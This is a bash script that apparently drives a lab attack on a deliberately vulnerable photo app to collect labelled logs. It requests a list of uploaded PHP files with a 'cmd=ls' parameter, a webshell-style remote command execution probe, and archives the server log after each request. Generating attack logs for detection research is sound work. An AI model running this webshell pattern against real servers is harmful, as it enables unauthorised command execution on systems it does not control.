
#!/bin/bash
base_url="http://10.5.20.45:8000/api/photos"
php_names_file="/home/utkalika/Work/vulnerable-photo-app/scripts/php_names.txt"
log_file="/home/utkalika/Work/Pluggable_Logging/Collector_logs/Vulnerable_Photo_App/PhotoService/Attack/2024-09-25_16-19-56.txt"
i=1

move_and_truncate_log() {
    new_log_file="/home/utkalika/Work/vulnerable-photo-app/logs/PhotoService/Attack/photos_rce_attack_${i}.log"
    cat "$log_file" > "$new_log_file" && truncate -s 0 "$log_file"
    echo "Log content moved to $new_log_file and source log file truncated."
}

while IFS= read -r php_file; do
    request_url="${base_url}/${php_file}?user_id=1&cmd=ls"
    response=$(curl -X GET "$request_url")
    sleep 3
    move_and_truncate_log
    ((i++))
    sleep 3

done < "$php_names_file"